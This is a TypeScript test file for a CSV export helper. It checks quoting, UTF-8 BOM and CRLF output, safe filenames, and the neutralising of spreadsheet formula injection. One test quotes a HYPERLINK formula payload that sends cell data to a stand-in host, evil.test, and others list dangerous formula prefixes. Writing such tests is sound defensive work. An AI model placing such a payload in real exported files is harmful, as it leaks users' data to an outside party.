// Run with: npx tsx admin/src/lib/csv.test.ts
import assert from 'node:assert/strict'
import { escapeCell, exportFilename, toCsv, type CsvColumn } from './csv'

let passed = 0
function test(name: string, fn: () => void) {
  try {
    fn()
    passed += 1
    console.log(`ok - ${name}`)
  } catch (error) {
    console.error(`FAIL - ${name}`)
    throw error
  }
}

test('plain values pass through unquoted', () => {
  assert.equal(escapeCell('simple'), 'simple')
  assert.equal(escapeCell(42), '42')
  assert.equal(escapeCell(true), 'true')
})

test('null and undefined become empty cells, not the strings', () => {
  assert.equal(escapeCell(null), '')
  assert.equal(escapeCell(undefined), '')
})

test('commas, quotes and newlines are quoted and escaped', () => {
  assert.equal(escapeCell('a,b'), '"a,b"')
  assert.equal(escapeCell('say "hi"'), '"say ""hi"""')
  assert.equal(escapeCell('line1\nline2'), '"line1\nline2"')
  assert.equal(escapeCell('carriage\rreturn'), '"carriage\rreturn"')
})

test('formula injection is neutralised for every dangerous prefix', () => {
  // A cell starting with any of these executes when the file is opened in
  // Excel, Sheets or Numbers. Prefixing with a quote makes it inert text.
  assert.equal(escapeCell('=1+1'), "'=1+1")
  assert.equal(escapeCell('+1'), "'+1")
  assert.equal(escapeCell('@SUM(A1)'), "'@SUM(A1)")
  // Tab gets the inert-text prefix but no quoting: it is not a special
  // character in RFC 4180, where the delimiter is the comma.
  assert.equal(escapeCell('\tstartswithtab'), "'\tstartswithtab")
})

test('the classic exfiltration payload is neutralised', () => {
  const payload = '=HYPERLINK("http://evil.test?d="&A1,"click")'
  const cell = escapeCell(payload)
  assert.ok(cell.startsWith('"\'=') || cell.startsWith("'="), `unexpected: ${cell}`)
  assert.ok(!cell.startsWith('=HYPERLINK'))
})

test('a negative number is still neutralised, since it leads with a minus', () => {
  // Slightly ugly in the spreadsheet, but a leading minus is a formula start
  // and correctness beats tidiness here.
  assert.equal(escapeCell('-5'), "'-5")
  // A real negative number is stringified the same way, so exports should pass
  // numbers already formatted if a raw minus matters.
  assert.equal(escapeCell(-5), "'-5")
})

test('dates are serialised as ISO strings', () => {
  assert.equal(escapeCell(new Date('2026-06-15T12:00:00Z')), '2026-06-15T12:00:00.000Z')
})

test('objects are serialised as JSON and quoted', () => {
  assert.equal(escapeCell({ a: 1 }), '"{""a"":1}"')
})

interface Row {
  id: string
  amount: number | null
}

const columns: CsvColumn<Row>[] = [
  { header: 'ID', value: (r) => r.id },
  { header: 'Amount', value: (r) => r.amount },
]

test('toCsv writes a header row and CRLF line endings', () => {
  const csv = toCsv([{ id: 'a', amount: 1 }], columns)
  const withoutBom = csv.replace(/^\ufeff/, '')
  assert.equal(withoutBom, 'ID,Amount\r\na,1\r\n')
})

test('toCsv starts with a UTF-8 BOM so Excel reads accents correctly', () => {
  const csv = toCsv([{ id: 'Zoë', amount: 1 }], columns)
  assert.equal(csv.charCodeAt(0), 0xfeff)
})

test('toCsv on an empty set still emits the header', () => {
  const csv = toCsv([], columns).replace(/^\ufeff/, '')
  assert.equal(csv, 'ID,Amount\r\n')
})

test('toCsv renders a null cell as empty', () => {
  const csv = toCsv([{ id: 'a', amount: null }], columns).replace(/^\ufeff/, '')
  assert.equal(csv, 'ID,Amount\r\na,\r\n')
})

test('exportFilename is filesystem safe and timestamped', () => {
  const name = exportFilename('Application Checks', new Date('2026-06-15T12:34:56Z'))
  assert.equal(name, 'application-checks-2026-06-15-12-34-56.csv')
  assert.ok(!/[^a-z0-9.-]/.test(name))
})

console.log(`\n${passed} tests passed`)
